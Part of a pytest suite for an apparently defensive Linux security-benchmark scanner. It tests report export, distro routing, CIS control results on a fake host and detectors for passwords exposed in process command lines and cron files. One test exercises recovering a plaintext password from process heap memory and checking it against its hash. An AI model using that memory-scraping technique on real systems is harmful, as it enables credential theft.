    absent_store = tmp_path / "no-store-here"
    rc = cli.main(["--store", str(absent_store), "report", "-f", str(moved),
                   "--format", "json", "--no-color"])
    assert rc == 0
    out = capsys.readouterr().out
    doc = _json.loads(out)                                   # valid JSON report
    assert doc["scan"]["host"] == scan.host
    assert not absent_store.exists(), "file-mode review must not create a store dir"


def test_report_file_writes_all_formats_off_box(tmp_path):
    # report -f <moved.json> -o <dir> regenerates every format with no store.
    from linux_secbench import cli
    saved = ScanStore(str(tmp_path / "src")).save(_run_fake_scan()[0])
    outdir = tmp_path / "review"
    absent_store = tmp_path / "no-store"
    rc = cli.main(["--store", str(absent_store), "report", "-f", saved,
                   "-o", str(outdir), "--no-color"])
    assert rc == 0
    for ext in ("html", "json", "csv", "md"):
        assert list(outdir.glob(f"secbench-*.{ext}")), f"missing .{ext}"
    assert not absent_store.exists(), "file-mode review must not create a store"


def test_report_from_store_writes_all_formats(tmp_path):
    from linux_secbench import cli
    store = ScanStore(str(tmp_path / "store"))
    scan = _run_fake_scan()[0]
    store.save(scan)
    outdir = tmp_path / "out"
    rc = cli.main(["--store", str(tmp_path / "store"), "report", scan.scan_id,
                   "-o", str(outdir), "--no-color"])
    assert rc == 0
    for ext in ("html", "json", "csv", "md"):
        assert list(outdir.glob(f"secbench-*.{ext}"))


def test_report_format_narrows_to_one(tmp_path):
    from linux_secbench import cli
    saved = ScanStore(str(tmp_path / "src")).save(_run_fake_scan()[0])
    outdir = tmp_path / "out"
    cli.main(["--store", str(tmp_path / "absent"), "report", "-f", saved,
              "--format", "html", "-o", str(outdir), "--no-color"])
    assert list(outdir.glob("secbench-*.html"))
    assert not list(outdir.glob("secbench-*.json"))


def test_report_single_format_to_stdout(tmp_path, capsys):
    import json as _json
    from linux_secbench import cli
    saved = ScanStore(str(tmp_path / "src")).save(_run_fake_scan()[0])
    rc = cli.main(["--store", str(tmp_path / "absent"), "report", "-f", saved,
                   "--format", "json", "--no-color"])
    assert rc == 0
    _json.loads(capsys.readouterr().out)        # valid JSON on stdout, no -o needed


def test_report_multiple_formats_without_output_errors(tmp_path):
    from linux_secbench import cli
    saved = ScanStore(str(tmp_path / "src")).save(_run_fake_scan()[0])
    rc = cli.main(["--store", str(tmp_path / "absent"), "report", "-f", saved,
                   "--format", "html", "json", "--no-color"])
    assert rc == 2                              # multiple formats need -o DIR


def test_report_missing_file_errors(tmp_path):
    from linux_secbench import cli
    rc = cli.main(["--store", str(tmp_path / "absent"), "report",
                   "-f", str(tmp_path / "nope.json"), "--no-color"])
    assert rc == 2


def test_report_requires_id_or_file(tmp_path):
    from linux_secbench import cli
    rc = cli.main(["--store", str(tmp_path / "absent"), "report", "--no-color"])
    assert rc == 2


def test_diff_two_standalone_files(tmp_path, capsys):
    from linux_secbench import cli
    src = ScanStore(str(tmp_path / "src"))
    old_path = src.save(_run_fake_scan()[0])
    host2 = FakeHost(); host2.sysctls["net.ipv4.ip_forward"] = "0"
    new_path = src.save(_run_fake_scan(host2)[0])
    # Two files, no --host, store that doesn't exist → still compares.
    rc = cli.main(["--store", str(tmp_path / "absent"), "diff", old_path, new_path, "--no-color"])
    assert rc == 0
    assert "Diff" in capsys.readouterr().out


def test_serve_file_mode_loopback_guard_and_sibling_suppressions(tmp_path):
    from linux_secbench import cli
    from linux_secbench.persistence import ScanStore as _SS
    saved = _SS(str(tmp_path / "src")).save(_run_fake_scan()[0])
    # Non-loopback still refused, even in file mode.
    rc = cli.main(["--store", str(tmp_path / "absent"), "serve", "-f", saved, "--bind", "0.0.0.0"])
    assert rc == 2
    # File-mode suppressions default to a sibling of the scan file.
    from linux_secbench.cli import _suppression_store
    sup = _suppression_store(ScanStore(str(tmp_path / "absent")), scan_source=saved)
    assert sup.path == saved + ".suppressions.json"


def test_serve_regenerate_writes_all_formats(tmp_path, monkeypatch):
    """The in-serve 'Regenerate report files' export() writes every format to
    --report-dir with the current suppressions applied."""
    from linux_secbench import cli
    from linux_secbench.reporting import serve as serve_mod
    saved = ScanStore(str(tmp_path / "src")).save(_run_fake_scan()[0])
    captured = {}

    def fake_run(render_html, suppress, unsuppress, bind, port, export=None):
        render_html()                      # smoke: HTML renders
        captured["result"] = export()      # invoke the real export closure

    monkeypatch.setattr(serve_mod, "run", fake_run)
    outdir = tmp_path / "reports"
    rc = cli.main(["--store", str(tmp_path / "absent"), "serve", "-f", saved,
                   "--report-dir", str(outdir)])
    assert rc == 0
    assert len(captured["result"]["files"]) == 4
    got = set(os.listdir(outdir))
    assert any(f.endswith(".html") for f in got) and any(f.endswith(".json") for f in got)
    assert any(f.endswith(".csv") for f in got) and any(f.endswith(".md") for f in got)


def test_serve_export_route_disabled_without_callback():
    """The /export route degrades to 501 when no export callback is wired."""
    from linux_secbench.reporting import serve as serve_mod
    h = serve_mod.make_handler(lambda: "<html></html>", lambda *a: None, lambda *a: None)
    assert serve_mod.make_handler.__defaults__[-1] is None  # export defaults to None
    # With a callback, make_handler accepts it without error.
    h2 = serve_mod.make_handler(lambda: "", lambda *a: None, lambda *a: None, export=lambda: {"dir": "/x", "files": []})
    assert h is not None and h2 is not None


def test_cmdline_no_false_positive_on_hyphenated_daemons():
    # The reported bug: `-p` matching inside ordinary daemon names.
    host = FakeHost()
    for pid, comm, cmd in [
        ("100", "pipewire-pulse", "/usr/bin/pipewire-pulse"),
        ("101", "iio-sensor-prox", "/usr/libexec/iio-sensor-proxy"),
        ("102", "power-profiles-", "/usr/libexec/power-profiles-daemon"),
        ("103", "(sd-pam)", "(sd-pam)"),
        ("104", "cron", "/usr/sbin/cron && run-parts --report /etc/cron.daily"),
    ]:
        host.procs[pid] = {"cmdline": cmd, "comm": comm, "environ": ""}
    res = {r.id: r for r in _run_fake_scan(host)[0].results}["EXT-CRED-7"]
    assert res.status is Status.PASS, res.evidence


def test_cmdline_flags_env_pass_and_mysql_password():
    host = FakeHost()
    host.procs["200"] = {"cmdline": "/usr/bin/app DB_PASSWORD=hunter2longpw", "comm": "app", "environ": ""}
    host.procs["201"] = {"cmdline": "mysql -psup3rsecretpw -h db01", "comm": "mysql", "environ": ""}
    res = {r.id: r for r in _run_fake_scan(host)[0].results}["EXT-CRED-7"]
    assert res.status is Status.FAIL
    joined = " ".join(res.evidence)
    assert "200" in joined and "201" in joined           # both flagged
    assert "hunter2longpw" not in joined                  # redacted by default
    assert "sup3rsecretpw" not in joined


def test_cron_no_false_positive_on_stock_lines():
    host = FakeHost()
    host.files["/etc/crontab"] = (
        "17 * * * * root cd / && run-parts --report /etc/cron.hourly\n"
        "25 6 * * * root test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }\n")
    host.files["/etc/cron.daily/man-db"] = "start-stop-daemon --start --pidfile /dev/null --startas /bin/sh\n"
    res = {r.id: r for r in _run_fake_scan(host)[0].results}["EXT-CRED-9"]
    assert res.status is Status.PASS, res.evidence


def test_cron_flags_real_embedded_secret():
    host = FakeHost()
    host.files["/etc/cron.d/backup"] = "0 2 * * * root PGPASSWORD=topsecretpw pg_dump -U admin db\n"
    res = {r.id: r for r in _run_fake_scan(host)[0].results}["EXT-CRED-9"]
    assert res.status is Status.FAIL
    assert "topsecretpw" not in " ".join(res.evidence)    # redacted


def test_apparmor_lists_complaining_profiles():
    host = FakeHost()
    host.command_map["aa-status"] = CommandResult(
        ["aa-status"], 0,
        "apparmor module is loaded.\n40 profiles are loaded.\n"
        "33 profiles are in enforce mode.\n   /usr/bin/evince\n"
        "3 profiles are in complain mode.\n"
        "   /usr/sbin/sssd\n   libreoffice-soffice\n   /usr/lib/snapd/snap-confine\n"
        "0 processes have profiles defined.\n")
    res = {r.id: r for r in _run_fake_scan(host)[0].results}["EXT-MON-1"]
    assert res.status is Status.WARN
    joined = " ".join(res.evidence)
    assert "/usr/sbin/sssd" in joined and "libreoffice-soffice" in joined


def test_memscan_verify_password_against_known_vectors():
    from linux_secbench.checks.extended.memscan import _verify_password
    h6 = ("$6$saltstring$svn8UoSVapNtMuq1ukKS4tPQd8iKwSMHWjl/O817G3uBnIFN"
          "jnQJuesI68u4OTLiBFdcbYEdFCoEOfaS35inz1")
    h5 = "$5$saltstring$5B8vYYiY.CVt1RlTTf8KbXBH3hsxY/GNooZaBBGWEc5"
    assert _verify_password("Hello world!", h6)
    assert not _verify_password("wrong-password", h6)
    assert _verify_password("Hello world!", h5)
    assert not _verify_password("Hello world!", "$6$saltstring$deadbeef")  # garbage hash → no match


def test_memscan_recover_and_confirm_from_synthetic_memory():
    # Prove the recover→verify pipeline end-to-end without touching /proc:
    # a heap blob holding the password near a needle, confirmed against its hash.
    from linux_secbench.checks.extended import memscan
    pw = b"Sup3rHeapPw!"
    blob = b"\x00noise\x00" + b"_pammodutil_getpwnam_" + b"\x00" + pw + b"\x00trailing\x00"
    cands = memscan._candidates([blob], [b"_pammodutil_getpwnam_"])
    assert pw in cands
    h = memscan._sha512_crypt(pw, "abcd1234", 5000, False)
    assert any(memscan._verify_password(c, h) for c in cands)


def test_memscan_is_gated_by_active_review():
    from linux_secbench.system.platform import detect_platform
    from linux_secbench.system.context import SystemContext

    def run(active, root=True):
        host = FakeHost(is_root=root)
        ctx = SystemContext(host, detect_platform(host))
        ctx.active_review = active
        target = ProfileTarget(Profile.SERVER, Level.L2)
        check = [c for c in registry.select(target, ctx) if c.id == "EXT-CRED-16"]
        return ScanRunner(ctx, target).run(check, "m").results[0].status

    assert run(False) is Status.SKIP                       # off by default
    # On the (non-local) fake host it degrades to MANUAL, never ERROR.
    assert run(True, True) is Status.MANUAL
    assert run(True, False) is Status.MANUAL


def test_expanded_catalogue_size_and_no_errors():
    # The ~50 new checks should bring the Security framework well past its
    # previous size, and none may ERROR on the fake host.
    sec = [c for c in registry if c.metadata.framework == "Security"]
    assert len(sec) >= 60, f"expected the expanded Security catalogue, got {len(sec)}"
    scan, _ = _run_fake_scan()
    assert not [r for r in scan.results if r.status is Status.ERROR]


# --------------------------------------------------------------------------- #
# Multi-distro, version-aware benchmark routing (Pass 1)
# --------------------------------------------------------------------------- #

def _plat(os_id, version_id, family):
    from linux_secbench.system.platform import PlatformInfo
    return PlatformInfo(os_id=os_id, version_id=version_id, family=family)


def _ctx_for(os_id, version_id, family):
    class _Ctx:  # minimal stand-in: applies_to/select only touch ctx.platform
        pass
    c = _Ctx()
    c.platform = _plat(os_id, version_id, family)
    return c


def _mk_check(cid, platforms):
    from linux_secbench.core.check import check
    from linux_secbench.core.model import Level, Outcome
    return check(id=cid, title=cid, section="s", levels=(Level.L1, Level.L2),
                 platforms=platforms, register=False)(lambda ctx: Outcome.passed())


def test_platform_matches_grammar():
    from linux_secbench.system.platform import platform_matches as pm
    ub = _plat("ubuntu", "24.04", "debian")
    rocky = _plat("rocky", "9.3", "rhel")
    deb = _plat("debian", "12", "debian")
    assert pm(("ubuntu:24.04",), ub) and not pm(("ubuntu:24.04",), rocky)
    assert pm(("rhel:9",), rocky)                      # family covers RHEL rebuilds
    assert not pm(("ubuntu:24.04",), _plat("ubuntu", "26.04", "debian"))  # exact only
    assert pm(("debian-family",), ub) and pm(("debian-family",), deb)
    assert not pm(("debian:12",), ub)                  # version disambiguates Ubuntu


def test_resolve_benchmark_edition_picks_nearest():
    from linux_secbench.system.platform import resolve_benchmark_edition as rbe
    eds = {"ubuntu": ["24.04"], "rhel": ["9"], "debian": ["12", "13"]}
    assert rbe(_plat("ubuntu", "24.04", "debian"), eds) == {
        "os": "ubuntu", "line": "ubuntu", "version": "24.04", "exact": True}
    assert rbe(_plat("rocky", "9.3", "rhel"), eds)["line"] == "rhel"      # rebuild → rhel
    # Future release with no published edition → nearest, flagged approximate.
    fut = rbe(_plat("ubuntu", "26.04", "debian"), eds)
    assert fut["version"] == "24.04" and fut["exact"] is False
    assert rbe(_plat("arch", "rolling", "arch"), eds) is None             # no edition


def test_select_routes_by_distro_and_falls_back():
    from linux_secbench.core.registry import Registry
    from linux_secbench.core.model import Profile, ProfileTarget, Level
    reg = Registry()
    for c in (_mk_check("U", ("ubuntu:24.04",)), _mk_check("R", ("rhel:9",)),
              _mk_check("P", ())):
        reg.add(c)
    target = ProfileTarget(Profile.SERVER, Level.L2)
    ids = lambda sel: {c.id for c in sel}
    assert ids(reg.select(target, _ctx_for("ubuntu", "24.04", "debian"))) == {"U", "P"}
    assert ids(reg.select(target, _ctx_for("rhel", "9.3", "rhel"))) == {"R", "P"}
    # Uncovered Ubuntu 26.04 still runs the nearest edition (24.04) + portable.
    assert ids(reg.select(target, _ctx_for("ubuntu", "26.04", "debian"))) == {"U", "P"}
    # A distro with no edition at all runs only portable checks.
    assert ids(reg.select(target, _ctx_for("arch", "rolling", "arch"))) == {"P"}


def test_metadata_platforms_roundtrip():
    from linux_secbench.core.model import CheckMetadata, CheckResult, Status
    md = CheckMetadata(id="X", title="t", section="s",
                       platforms=("rhel:9", "debian-family"))
    rt = CheckResult.from_dict(CheckResult(metadata=md, status=Status.PASS).to_dict())
    assert rt.metadata.platforms == ("rhel:9", "debian-family")


def _run_checks(host, ids):
    from linux_secbench.system.platform import detect_platform
    from linux_secbench.system.context import SystemContext
    ctx = SystemContext(host, detect_platform(host))
    return {c.id: c.run(ctx) for c in registry if c.id in set(ids)}


def test_cis_v2_filesystem_section_rebased():
    """CIS v2.0.0 §1.1: the new control set is present and runs clean."""
    from linux_secbench.core.model import Status
    ids = {c.metadata.id for c in registry}
    # v2.0.0 additions over the old v1.0.0 set.
    for cid in ("1.1.1.9", "1.1.1.10", "1.1.1.11", "1.1.2.7.1", "1.1.2.7.4", "1.1.2.5.4"):
        assert cid in ids, f"missing v2.0.0 control {cid}"
    titles = {c.metadata.id: c.metadata.title for c in registry}
    assert titles["1.1.1.9"] == "Ensure firewire-core kernel module is not available"
    # The §1.1 section runs without ERROR on the fake host…
    scan, _ = _run_fake_scan()
    s11 = [r for r in scan.results if r.id.startswith("1.1.")]
    assert len(s11) >= 37 and not any(r.status is Status.ERROR for r in s11)
    # …and 1.1.1.11 is the manual control.
    assert next(r for r in scan.results if r.id == "1.1.1.11").status is Status.MANUAL


def test_cis_v2_section1_complete_and_clean():
    """CIS v2.0.0 §1.2–§1.7 are present and the whole section runs without ERROR."""
    from linux_secbench.core.model import Profile, ProfileTarget, Level, Status
    from linux_secbench.system.platform import detect_platform
    from linux_secbench.system.context import SystemContext
    from linux_secbench.core.runner import ScanRunner
    ids = {c.metadata.id for c in registry}
    for cid in ("1.2.1.4", "1.2.2.1", "1.3.1.1", "1.3.1.2", "1.3.1.4", "1.4.2",
                "1.5.6", "1.5.7", "1.5.11", "1.5.12", "1.6.5", "1.6.10", "1.7.2", "1.7.6"):
        assert cid in ids, f"missing v2.0.0 control {cid}"
    host = FakeHost()
    ctx = SystemContext(host, detect_platform(host))
    target = ProfileTarget(Profile.WORKSTATION, Level.L2)
    s1 = [c for c in registry.select(target, ctx) if c.metadata.id.startswith("1.")]
    scan = ScanRunner(ctx, target).run(s1, "s1")
    assert len(scan.results) >= 80
    assert not [r for r in scan.results if r.status is Status.ERROR]
    by_id = {r.id: r for r in scan.results}
    # GDM controls are not applicable (PASS) when no display manager is installed.
    assert by_id["1.7.2"].status is Status.PASS and "not installed" in by_id["1.7.2"].summary
    # Apport is not installed on the fake host → PASS.
    assert by_id["1.5.7"].status is Status.PASS


def test_cis_v2_section2_services_rebased():
    """CIS v2.0.0 §2 Services: 45 controls present, run clean, behave correctly."""
    from linux_secbench.core.model import Profile, ProfileTarget, Level, Status
    from linux_secbench.system.platform import detect_platform
    from linux_secbench.system.context import SystemContext
    from linux_secbench.core.runner import ScanRunner
    ids = {c.metadata.id for c in registry}
    for cid in ("2.1.2", "2.1.4", "2.1.23", "2.2.4", "2.3.1.1", "2.3.2.2",
                "2.3.3.2", "2.4.1.1", "2.4.1.9", "2.4.2.1"):
        assert cid in ids, f"missing v2.0.0 control {cid}"
    host = FakeHost()
    ctx = SystemContext(host, detect_platform(host))
    target = ProfileTarget(Profile.SERVER, Level.L2)
    s2 = [c for c in registry.select(target, ctx) if c.metadata.id.startswith("2.")]
    scan = ScanRunner(ctx, target).run(s2, "s2")
    assert len(scan.results) >= 45
    assert not [r for r in scan.results if r.status is Status.ERROR]
    by_id = {r.id: r for r in scan.results}
    assert by_id["2.2.4"].status is Status.FAIL          # telnet client installed on the fake host
    assert by_id["2.1.4"].status is Status.MANUAL        # approved-listening is operator review


def test_cis_v2_section3_network_rebased():
    """CIS v2.0.0 §3 Network: 35 controls present, run clean, behave correctly."""
    from linux_secbench.core.model import Profile, ProfileTarget, Level, Status
    from linux_secbench.system.platform import detect_platform
    from linux_secbench.system.context import SystemContext
    from linux_secbench.core.runner import ScanRunner
    ids = {c.metadata.id for c in registry}
    # §3.2 grew to 6 modules; §3.3 splits every sysctl into its own id.
    for cid in ("3.1.1", "3.1.2", "3.1.3", "3.2.1", "3.2.6",
                "3.3.1.1", "3.3.1.18", "3.3.2.1", "3.3.2.8"):
        assert cid in ids, f"missing v2.0.0 control {cid}"
    host = FakeHost()
    ctx = SystemContext(host, detect_platform(host))
    target = ProfileTarget(Profile.SERVER, Level.L2)
    s3 = [c for c in registry.select(target, ctx) if c.metadata.id.split(".")[0] == "3"]
    scan = ScanRunner(ctx, target).run(s3, "s3")
    assert len(scan.results) >= 35
    assert not [r for r in scan.results if r.status is Status.ERROR]
    by_id = {r.id: r for r in scan.results}
    assert by_id["3.1.1"].status is Status.MANUAL        # IPv6 status = operator review
    assert by_id["3.1.3"].status is Status.PASS          # bluez not installed on the fake host
    assert by_id["3.3.1.1"].status is Status.FAIL        # ip_forward = 1 on the fake host
    assert by_id["3.3.1.12"].status is Status.PASS       # rp_filter = 1
    # A disallowed module is loadable by default on the fake host → FAIL.
    assert by_id["3.2.5"].status is Status.FAIL          # sctp loadable

    # Hardened host: ip_forward off and sctp blacklisted → those flip to PASS.
    from linux_secbench.system.executor import CommandResult
    host2 = FakeHost()
    host2.sysctls["net.ipv4.ip_forward"] = "0"
    host2.command_map["modprobe -n -v sctp"] = CommandResult(["modprobe"], 0, "install /bin/false\n")
    ctx2 = SystemContext(host2, detect_platform(host2))
    got = {c.metadata.id: c.run(ctx2)
           for c in registry.select(target, ctx2) if c.metadata.id in ("3.3.1.1", "3.2.5")}
    assert got["3.3.1.1"].status is Status.PASS
    assert got["3.2.5"].status is Status.PASS


def test_cis_v2_section7_maintenance_rebased():
    """CIS v2.0.0 §7 System Maintenance: 23 controls, run clean, behave correctly."""
    from linux_secbench.core.model import Profile, ProfileTarget, Level, Status
    from linux_secbench.system.platform import detect_platform
    from linux_secbench.system.context import SystemContext
    from linux_secbench.core.runner import ScanRunner
    ids = {c.metadata.id for c in registry}
    for cid in ("7.1.1", "7.1.9", "7.1.10", "7.1.11", "7.1.12", "7.1.13",
                "7.2.1", "7.2.2", "7.2.3", "7.2.4", "7.2.6", "7.2.7", "7.2.8",
                "7.2.9", "7.2.10"):
        assert cid in ids, f"missing v2.0.0 control {cid}"
    # The v1.0.0 root-PATH check moved to §5 (5.4.2.5); it must not live in §7.
    assert "7.2.8" in ids  # now "duplicate group names", not root PATH

    host = FakeHost()
    ctx = SystemContext(host, detect_platform(host))
    target = ProfileTarget(Profile.SERVER, Level.L2)
    s7 = [c for c in registry.select(target, ctx) if c.metadata.id.split(".")[0] == "7"]
    scan = ScanRunner(ctx, target).run(s7, "s7")
    assert len(scan.results) == 23
    assert not [r for r in scan.results if r.status is Status.ERROR]
    by_id = {r.id: r for r in scan.results}
    assert by_id["7.1.1"].status is Status.PASS           # /etc/passwd perms ok
    assert by_id["7.2.2"].status is Status.FAIL           # guest has an empty shadow password
    assert by_id["7.2.5"].status is Status.FAIL           # root + backdoor share UID 0
    assert by_id["7.1.13"].status is Status.MANUAL        # SUID/SGID review is operator-driven

    # Non-root degraded path: still no ERRORs (shadow read → MANUAL).
    host_nr = FakeHost(is_root=False)
    ctx_nr = SystemContext(host_nr, detect_platform(host_nr))
    s7_nr = [c.run(ctx_nr) for c in registry.select(target, ctx_nr)
             if c.metadata.id.split(".")[0] == "7"]
    assert not [r for r in s7_nr if r.status is Status.ERROR]


def test_cis_v2_section6_logging_rebased():
    """CIS v2.0.0 §6 Logging & Auditing: 69 controls, run clean, behave correctly."""
    from linux_secbench.core.model import Profile, ProfileTarget, Level, Status
    from linux_secbench.system.platform import detect_platform
    from linux_secbench.system.context import SystemContext
    from linux_secbench.core.runner import ScanRunner
    ids = {c.metadata.id for c in registry}
    for cid in ("6.1.1.1.1", "6.1.1.1.6", "6.1.2.1", "6.1.2.3", "6.1.3.1",
                "6.2.1.2", "6.2.2.2", "6.2.3.1", "6.2.3.12", "6.2.3.29",
                "6.2.3.30", "6.2.4.2", "6.2.4.8", "6.3.1", "6.3.3"):
        assert cid in ids, f"missing v2.0.0 control {cid}"

    host = FakeHost()
    ctx = SystemContext(host, detect_platform(host))
    target = ProfileTarget(Profile.SERVER, Level.L2)
    s6 = [c for c in registry.select(target, ctx) if c.metadata.id.split(".")[0] == "6"]
    scan = ScanRunner(ctx, target).run(s6, "s6")
    assert len(scan.results) == 69
    assert not [r for r in scan.results if r.status is Status.ERROR]
    by_id = {r.id: r for r in scan.results}
    assert by_id["6.1.1.1.1"].status is Status.PASS       # journald active
    assert by_id["6.2.1.2"].status is Status.PASS          # auditd enabled+active
    assert by_id["6.2.3.12"].status is Status.PASS         # /etc/passwd watch present
    assert by_id["6.2.3.29"].status is Status.PASS         # immutable (-e 2)
    assert by_id["6.2.4.8"].status is Status.PASS          # audit tools <= 0755
    assert by_id["6.2.3.30"].status is Status.MANUAL       # running-vs-disk is operator review

    # A host without auditd rules → audit-rule checks FAIL (not ERROR).
    host2 = FakeHost()
    host2.files["@audit-rules"] = ""
    host2.files["/etc/audit/audit.rules"] = ""
    host2.files["/etc/audit/rules.d/audit.rules"] = ""
    ctx2 = SystemContext(host2, detect_platform(host2))
    got = {c.metadata.id: c.run(ctx2)
           for c in registry.select(target, ctx2) if c.metadata.id.split(".")[0] == "6"}
    assert got["6.2.3.12"].status is Status.FAIL
    assert not [r for r in got.values() if r.status is Status.ERROR]


def test_cis_v2_section5_access_rebased():
    """CIS v2.0.0 §5 Access Control: 74 controls, run clean, behave correctly."""
    from linux_secbench.core.model import Profile, ProfileTarget, Level, Status
    from linux_secbench.system.platform import detect_platform
    from linux_secbench.system.context import SystemContext
    from linux_secbench.core.runner import ScanRunner
    ids = {c.metadata.id for c in registry}
    for cid in ("5.1.1", "5.1.2", "5.1.3", "5.1.7", "5.1.20", "5.1.23", "5.1.24",
                "5.2.4", "5.2.6", "5.2.7", "5.3.1.1", "5.3.2.2", "5.3.3.1.1",
                "5.3.3.2.2", "5.3.3.3.1", "5.3.3.4.3", "5.4.1.4", "5.4.2.1",
                "5.4.2.7", "5.4.3.2"):
        assert cid in ids, f"missing v2.0.0 control {cid}"

    host = FakeHost()
    ctx = SystemContext(host, detect_platform(host))
    target = ProfileTarget(Profile.SERVER, Level.L2)
    s5 = [c for c in registry.select(target, ctx) if c.metadata.id.split(".")[0] == "5"]
    scan = ScanRunner(ctx, target).run(s5, "s5")
    assert len(scan.results) == 74
    assert not [r for r in scan.results if r.status is Status.ERROR]
    by_id = {r.id: r for r in scan.results}
    # Hardened SSH/PAM bits PASS on the fake host…
    assert by_id["5.1.20"].status is Status.PASS          # PermitRootLogin no
    assert by_id["5.1.2"].status is Status.PASS           # private host-key perms ok
    assert by_id["5.2.1"].status is Status.PASS           # sudo installed
    assert by_id["5.2.7"].status is Status.PASS           # su restricted via pam_wheel
    assert by_id["5.3.3.2.2"].status is Status.PASS       # minlen = 14
    # …while the intentional flaws FAIL.
    assert by_id["5.2.4"].status is Status.FAIL           # NOPASSWD rule present
    assert by_id["5.4.2.1"].status is Status.FAIL         # UID-0 backdoor
    assert by_id["5.4.2.7"].status is Status.FAIL         # system account with a shell
    # Operator-review controls degrade to MANUAL, not ERROR.
    assert by_id["5.1.24"].status is Status.MANUAL        # ListenAddress is site-specific

    # Non-root degraded path: still no ERRORs.
    host_nr = FakeHost(is_root=False)
    ctx_nr = SystemContext(host_nr, detect_platform(host_nr))
    s5_nr = [c.run(ctx_nr) for c in registry.select(target, ctx_nr)
             if c.metadata.id.split(".")[0] == "5"]
    assert not [r for r in s5_nr if r.status is Status.ERROR]


def test_cis_v2_section4_firewall_rebased():
    """CIS v2.0.0 §4: collapsed to 5 ufw controls, run clean, behave correctly."""
    from linux_secbench.core.model import Profile, ProfileTarget, Level, Status
    from linux_secbench.system.platform import detect_platform
    from linux_secbench.system.context import SystemContext
    from linux_secbench.core.runner import ScanRunner
    ids = {c.metadata.id for c in registry}
    for cid in ("4.1.1", "4.1.2", "4.1.3", "4.1.4", "4.1.5"):
        assert cid in ids, f"missing v2.0.0 control {cid}"
    # The v1.0.0 nftables/firewalld ids are gone.
    assert "4.3.1" not in ids and "4.2.7" not in ids

    host = FakeHost()  # ufw installed, service enabled+active, default deny incoming
    ctx = SystemContext(host, detect_platform(host))
    target = ProfileTarget(Profile.SERVER, Level.L2)
    s4 = [c for c in registry.select(target, ctx) if c.metadata.id.split(".")[0] == "4"]
    scan = ScanRunner(ctx, target).run(s4, "s4")
    assert len(scan.results) == 5
    assert not [r for r in scan.results if r.status is Status.ERROR]
    by_id = {r.id: r for r in scan.results}
    assert by_id["4.1.1"].status is Status.PASS
    assert by_id["4.1.2"].status is Status.PASS
    assert by_id["4.1.3"].status is Status.PASS          # deny (incoming)
    assert by_id["4.1.4"].status is Status.PASS          # allow (outgoing) — explicitly set

    # Host without ufw → 4.1.1 FAILs, the rest SKIP, still no ERRORs.
    host2 = FakeHost()
    host2.installed.discard("ufw")
    ctx2 = SystemContext(host2, detect_platform(host2))
    got = {c.metadata.id: c.run(ctx2)
           for c in registry.select(target, ctx2) if c.metadata.id.split(".")[0] == "4"}
    assert got["4.1.1"].status is Status.FAIL
    assert not [r for r in got.values() if r.status is Status.ERROR]


def test_cis_v2_mount_options_pass_and_fail():
    from linux_secbench.system.executor import CommandResult
    from linux_secbench.core.model import Status
    host = FakeHost()
    # /tmp is a separate mount with all hardening options applied → those PASS.
    host.command_map["findmnt --kernel --noheadings --output TARGET /tmp"] = CommandResult(["findmnt"], 0, "/tmp")
    host.command_map["findmnt --kernel --noheadings --output OPTIONS /tmp"] = \
        CommandResult(["findmnt"], 0, "rw,nosuid,nodev,noexec,relatime")
    got = _run_checks(host, ["1.1.2.1.1", "1.1.2.1.2", "1.1.2.1.4", "1.1.2.7.2"])
    assert got["1.1.2.1.1"].status is Status.PASS    # separate partition
    assert got["1.1.2.1.2"].status is Status.PASS    # nodev present
    assert got["1.1.2.1.4"].status is Status.PASS    # noexec present
    # /var/log/audit has no separate mount on the fake host → FAIL, never ERROR.
    assert got["1.1.2.7.2"].status is Status.FAIL


def test_cis_catalogue_is_gated_to_ubuntu_edition():
    """The real CIS catalogue runs on Ubuntu, auto-skips on RHEL/Debian (whose
    benchmarks are separate), and falls back to nearest on an uncovered release."""
    from linux_secbench.core.model import Profile, ProfileTarget, Level
    target = ProfileTarget(Profile.SERVER, Level.L2)

    def cis_on(os_id, ver, fam):
        ctx = _ctx_for(os_id, ver, fam)
        return sum(1 for c in registry.select(target, ctx) if c.metadata.framework == "CIS")

    ubuntu = cis_on("ubuntu", "24.04", "debian")
    assert ubuntu >= 100                               # the full Ubuntu set runs
    assert cis_on("rhel", "9.3", "rhel") == 0          # no Ubuntu CIS on RHEL
    assert cis_on("debian", "12", "debian") == 0       # nor on Debian (yet)
    assert cis_on("ubuntu", "26.04", "debian") == ubuntu  # nearest-edition fallback


def test_scan_stamps_resolved_benchmark_edition():
    scan, _ = _run_fake_scan()                         # fake host is Ubuntu 24.04
    bm = scan.host_facts.get("benchmark")
    assert bm and bm["line"] == "ubuntu" and bm["version"] == "24.04" and bm["exact"] is True


def test_benchmark_note_is_edition_aware():
    from linux_secbench.reporting.base import benchmark_note
    assert benchmark_note({"benchmark": {"os": "ubuntu", "line": "ubuntu",
                                         "version": "24.04", "exact": True}}) == ""
    note = benchmark_note({"version_id": "26.04",
                           "benchmark": {"os": "ubuntu", "line": "ubuntu",
                                         "version": "24.04", "exact": False}})
    assert "approximate" in note and "Ubuntu 24.04" in note
